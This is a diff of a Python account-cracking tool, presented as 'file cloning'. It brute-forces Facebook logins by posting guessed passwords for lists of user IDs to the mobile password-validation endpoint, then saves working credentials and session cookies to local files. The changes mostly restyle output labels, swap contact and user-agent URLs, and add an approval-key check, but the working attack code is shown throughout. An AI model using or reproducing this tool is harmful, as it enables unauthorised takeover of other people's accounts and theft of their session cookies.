@@ -233,7 +233,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://github.com/taxs-404/approval/blob/main/approval.txt').text
+        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
         ua=open('bbnew.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -349,27 +349,27 @@ def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
-\033[1;97m d8888 8888888888P 8888888 
+ \033[1;97m d8888 8888888888P 8888888 
 \033[1;97md88888       d88P    888   
 \033[1;97md88P888      d88P     888   
 \033[1;97md88P 888     d88P      888   
 \033[1;97md88P  888    d88P       888   
 \033[1;97md88P   888   d88P        888   
 \033[1;97md8888888888  d88P         888   
-\033[1;97md88P     888 d8888888888 8888888 
-
+\033[1;97md88P     888 d8888888888 8888888                                                                                
+ 
 \033[1;27m==================================================
-[] AUTHOR    :  ART CÉ
-[] TOOLS     :  FILE CLONING 
-[] TYPE      :  PAID/FREE TOOL   
+[] AUTHOR      :  ART CÉ
+[] TOOLS        :  FILE CLONING 
+[] TYPE          :  PAID/FREE TOOL   
 [] FACEBOOK  :  ART CÉ ACHARII
-[] VERSION   :  0.1
+[] VERSION     :  0.1
 =================================================="\033[1;27m"""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
-#####os.system('espeak -a 300 " WELCOME TO ART CÉ  FILE CLONING TOOLS"')
+#####os.system('espeak -a 300 " WELCOME TO AZI FILE CLONING TOOLS"')
 pass
  
 def login():
@@ -418,7 +418,7 @@ def approval():
   try:
     httpCaht = requests.get('https://github.com/taxs-404/approval/blob/main/approval.txt').text
     if id in httpCaht:
-      print("\33[1;32m[•] Your key Successfuly Approved")
+      print("\33[1;32m[•] 𝐘𝐨𝐮 𝐤𝐞𝐲 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐲 𝐀𝐩𝐨𝐫𝐨𝐯𝐞𝐝")
       os.system('espeak -a 300 " permission granted"')
       time.sleep(0.2)
       os.system('espeak -a 300 " WELCOME TO ART FILE CLONING TOOLS"')
@@ -498,7 +498,7 @@ def ckx():
     except:
             sys.exit()
 def monu():
-    correct_access_key = "ART"
+    correct_access_key = "art"
     attempts = 0
     max_attempts = 2  # Set the maximum number of login attempts
     os.system("clear")
@@ -535,7 +535,7 @@ def menu():
     print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
     print('\033[0;97m=========================================================')
-    print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[1;30mFILE CLONING         """)
+    print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[1;30m𝑭𝒊𝒍𝒆 𝑪𝒍𝒐𝒏𝒊𝒏𝒈         """)
     print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93mCONTACT WITH ADMIN""")
     print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """)
     print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
@@ -547,7 +547,7 @@ def menu():
     elif RIPON in ['1']:
         crack_file()
     elif RIPON in ['2','02']:
-        os.system('xdg-open https://wa.me/+639098660941')
+        os.system('xdg-open https://wa.me/+639635303304')
         os.system("python nono.py")
     elif RIPON in ['3','03']:
         result()
@@ -729,7 +729,7 @@ def dump_massal():
 def crack_file():
     print('\033[0;91m=========================================================')
     os.system('espeak -a 300 " YOUR FILE LOCATION"')
-    print('\033[1;32m[ Put File Example:  /sdcard/art.txt  Etc...]')
+    print('\033[1;32m[ Put File Example:  /sdcard/king.txt  Etc...]')
     o = input('\033[97;1m[\033[92;1m+\033[1;31m] INPUT FILE LOCATION :\033[92;1m ')
     try:lin = open(o).read().splitlines()
     except:
@@ -904,12 +904,12 @@ def crack(idf,pwv):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
-}        
+}           
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;96m[C.I] {idf} • {pw}')
+                print(f'\r\033[0;96m[𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
-                open('/sdcard/M1•DEAD.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/M1•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+ps+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -917,9 +917,9 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;90m[ALIVE❤️] {idf} • {pw}\n\033[0;36m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                print(f'\r\033[0;90m[𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ❤️] {idf} • {pw}\n\033[0;36m[🌺]= COOKIES • \033[0;92m{kuki} ')
                 os.system('espeak -a 300 "CONGRATS,  YOU,  GOT,  A,  OK,  id"')
-                open('/sdcard/M1•ALIVE.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
+                open('/sdcard/M1•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
                 break
                 
             else:
@@ -929,7 +929,7 @@ def crack(idf,pwv):
     loop+=1
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[CRACKING <M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[ꜱᴄᴀɴɴɪɴɢ <M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -966,9 +966,9 @@ def crackfree(idf,pwv):
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•C.I] {idf} • {pw}')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
-                open('/sdcard/Cyber-V6/M2•DEAD.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/Cyber-V6/M2•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+ps+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -976,9 +976,9 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ALIVE❤️] {idf} • {pw} ')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ❤️] {idf} • {pw} ')
                 os.system('espeak -a 300 "CONGRATS,  YOU,  GOT,  AN,  OK,  id"')
-                open('/sdcard/M2•ALIVE.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/M2•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+ps+'\n')
                 break
                 
             else:
@@ -994,3 +994,4 @@ if __name__=='__main__':
     try:os.system('touch .prox.txt')
     except:pass
 monu()
+approval()
